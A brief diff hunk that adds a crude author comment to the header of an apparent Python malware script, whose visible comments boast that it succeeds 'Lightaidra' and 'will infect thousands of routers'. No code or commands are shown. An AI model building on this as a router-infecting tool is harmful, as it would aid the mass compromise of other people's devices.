@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+#NOTE This script kind of sucks, please don't ask me questions about it, it's a piece of shit. --shellz
 # Updated by shellz, Nov 1, 2016
 #~WhitePacket
 #Lightaidra sucked, so here's 2.0 - will infect thousands of routers.
